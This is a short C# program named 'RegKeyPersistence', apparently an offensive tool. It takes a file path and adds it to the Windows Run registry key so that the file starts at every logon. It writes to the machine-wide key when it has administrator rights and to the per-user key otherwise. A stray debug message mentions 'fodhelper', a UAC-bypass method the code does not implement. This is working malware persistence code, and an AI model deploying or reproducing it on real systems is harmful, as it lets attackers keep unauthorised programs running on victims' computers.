using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RegKeyPersistence
{
    class Program
    {
        static void Main(string[] args)
        {
#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener("pers.log"));
#endif

            string fileName = args[0];
            if (!File.Exists(fileName))
            {
                Debug.WriteLine("The file {arg} specified in the argument is not valid");
                Debug.Flush();
                return;
            }

            Debug.WriteLine("Starting Persistence!");
            Debug.Flush();

            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);

            try
            {
                RegistryKey rk;
                Debug.WriteLine($"Setting value {fileName}!");
                Debug.Flush();
                if(hasAdministrativeRight)
                    rk = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                else
                    rk = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                rk.SetValue("test", fileName, RegistryValueKind.String);
                Debug.WriteLine($"Executing fodhelper!");
                rk.Close();
                Environment.Exit(0);
            }
            catch (Exception ex)
            {

                Debug.WriteLine("An exception occured: " + ex.Message);
                Debug.Flush();
                Environment.Exit(-1);
            }

            Debug.WriteLine($"Persistance ran on {fileName}!");
            Debug.Flush();

            Thread.Sleep(1000);
            Debug.Flush();

            Environment.Exit(-1);
        }
    }
}
